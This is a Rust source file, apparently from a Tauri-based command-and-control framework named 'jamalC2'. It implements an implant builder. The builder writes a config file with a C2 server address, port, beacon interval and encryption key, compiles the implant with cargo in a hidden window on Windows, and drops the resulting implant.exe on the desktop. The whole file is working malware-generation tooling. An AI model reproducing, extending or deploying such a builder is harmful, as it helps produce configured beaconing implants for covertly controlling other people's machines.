//! Implant 生成器 Tauri 命令

use serde::{Deserialize, Serialize};
use std::fs;
use std::path::PathBuf;
use std::process::Command;

#[derive(Debug, Deserialize)]
pub struct BuildRequest {
    pub server_host: String,
    pub server_port: u16,
    pub use_tls: bool,
    pub tag: String,
    pub output_name: String,
    pub encryption_key: String,
}

#[derive(Debug, Serialize)]
pub struct BuildResult {
    pub success: bool,
    pub output_path: Option<String>,
    pub error: Option<String>,
}

/// 查找 implant 模板目录
fn find_implant_template() -> Option<PathBuf> {
    // 尝试多种路径查找方式
    let candidates = [
        // 开发模式: server/src-tauri/target/debug/server.exe -> jamalC2/implant
        PathBuf::from("D:/project1/jamalC2/implant"),
        // 相对于当前工作目录
        PathBuf::from("../implant"),
        PathBuf::from("../../implant"),
        // 相对于 exe 路径
        std::env::current_exe().ok().and_then(|p| {
            p.parent()
                .and_then(|p| p.parent())
                .and_then(|p| p.parent())
                .and_then(|p| p.parent())
                .and_then(|p| p.parent())
                .map(|p| p.join("implant"))
        }).unwrap_or_default(),
    ];
    
    for candidate in candidates {
        if candidate.exists() && candidate.join("Cargo.toml").exists() {
            return Some(candidate);
        }
    }
    
    None
}

/// 生成 Implant
#[tauri::command]
pub async fn build_implant(request: BuildRequest) -> Result<BuildResult, String> {
    // 获取 implant 模板目录
    let implant_template_dir = find_implant_template()
        .ok_or_else(|| {
            "Implant template not found. Please ensure 'implant' directory exists at D:/project1/jamalC2/implant".to_string()
        })?;
    
    // 获取 shared 目录
    let shared_dir = implant_template_dir.parent()
        .map(|p| p.join("shared"))
        .ok_or("Cannot find shared directory")?;
    
    if !shared_dir.exists() {
        return Err(format!("Shared library not found at: {:?}", shared_dir));
    }
    
    // 创建临时构建目录
    let build_dir = std::env::temp_dir().join(format!("jamalc2_build_{}", uuid::Uuid::new_v4()));
    fs::create_dir_all(&build_dir).map_err(|e| e.to_string())?;
    
    // 复制 implant 模板到临时目录
    let temp_implant_dir = build_dir.join("implant");
    copy_dir_recursive(&implant_template_dir, &temp_implant_dir).map_err(|e| e.to_string())?;
    
    // 复制 shared 目录到临时目录
    let temp_shared_dir = build_dir.join("shared");
    copy_dir_recursive(&shared_dir, &temp_shared_dir).map_err(|e| e.to_string())?;
    
    // 修改 config.rs
    let config_path = temp_implant_dir.join("src").join("config.rs");
    let config_content = generate_config(&request);
    fs::write(&config_path, config_content).map_err(|e| e.to_string())?;
    
    // 编译（隐藏窗口）
    #[cfg(windows)]
    let output = {
        use std::os::windows::process::CommandExt;
        const CREATE_NO_WINDOW: u32 = 0x08000000;
        Command::new("cargo")
            .args(["build", "--release"])
            .current_dir(&temp_implant_dir)
            .creation_flags(CREATE_NO_WINDOW)
            .output()
            .map_err(|e| e.to_string())?
    };
    
    #[cfg(not(windows))]
    let output = {
        Command::new("cargo")
            .args(["build", "--release"])
            .current_dir(&temp_implant_dir)
            .output()
            .map_err(|e| e.to_string())?
    };
    
    if !output.status.success() {
        let stderr = String::from_utf8_lossy(&output.stderr);
        // 清理临时目录
        let _ = fs::remove_dir_all(&build_dir);
        return Ok(BuildResult {
            success: false,
            output_path: None,
            error: Some(format!("Build failed: {}", stderr)),
        });
    }
    
    // 复制生成的 exe 到输出目录
    let built_exe = temp_implant_dir.join("target").join("release").join("implant.exe");
    let output_dir = dirs::desktop_dir().unwrap_or_else(|| PathBuf::from("."));
    let output_path = output_dir.join(format!("{}.exe", request.output_name));
    
    fs::copy(&built_exe, &output_path).map_err(|e| e.to_string())?;
    
    // 清理临时目录
    let _ = fs::remove_dir_all(&build_dir);
    
    Ok(BuildResult {
        success: true,
        output_path: Some(output_path.to_string_lossy().to_string()),
        error: None,
    })
}

/// 生成配置文件内容
fn generate_config(request: &BuildRequest) -> String {
    format!(r#"//! Implant 配置
//! 这些值会在生成时被 Builder 修改

/// 服务器地址 (IP 或域名)
pub const SERVER_HOST: &str = "{}";

/// 服务器端口
pub const SERVER_PORT: u16 = {};

/// 使用 HTTPS
pub const USE_TLS: bool = {};

/// 客户端标签
pub const TAG: &str = "{}";

/// Beacon 轮询间隔 (秒)
pub const HEARTBEAT_INTERVAL: u64 = 30;

/// 重连延迟 (秒)
pub const RECONNECT_DELAY: u64 = 5;

/// 版本号
pub const VERSION: &str = "1.0.0";

/// 加密密钥 (64 hex chars = 32 bytes)
pub const ENCRYPTION_KEY: &str = "{}";

/// 获取服务器 HTTP URL
pub fn get_http_url() -> String {{
    let scheme = if USE_TLS {{ "https" }} else {{ "http" }};
    format!("{{}}://{{}}:{{}}", scheme, SERVER_HOST, SERVER_PORT)
}}
"#, request.server_host, request.server_port, request.use_tls, request.tag, request.encryption_key)
}

/// 递归复制目录
fn copy_dir_recursive(src: &PathBuf, dst: &PathBuf) -> std::io::Result<()> {
    if !dst.exists() {
        fs::create_dir_all(dst)?;
    }
    
    for entry in fs::read_dir(src)? {
        let entry = entry?;
        let src_path = entry.path();
        let dst_path = dst.join(entry.file_name());
        
        if src_path.is_dir() {
            // 跳过 target 目录
            if entry.file_name() == "target" {
                continue;
            }
            copy_dir_recursive(&src_path, &dst_path)?;
        } else {
            fs::copy(&src_path, &dst_path)?;
        }
    }
    
    Ok(())
}
